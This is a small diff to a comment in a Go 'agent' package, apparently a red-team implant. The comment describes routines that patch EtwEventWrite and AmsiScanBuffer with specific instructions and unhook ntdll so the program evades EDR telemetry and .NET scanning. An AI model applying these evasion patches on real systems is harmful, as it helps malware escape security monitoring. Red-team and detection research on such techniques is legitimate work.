@@ -7,7 +7,7 @@ package agent
 //  patchETW    — overwrites EtwEventWrite with xor rax,rax;ret, blinding
 //                process-level ETW telemetry used by most EDRs.
 //  patchAMSI   — overwrites AmsiScanBuffer with mov eax,E_INVALIDARG;ret,
-//                bypassing .NET assembly scanning (needed before exec-asm).
+//                bypassing .NET assembly scanning (needed before dotnet-asm).
 //  unhookNtdll — loads a clean ntdll copy from disk and restores any function
 //                whose prologue has been overwritten with a JMP hook.
 
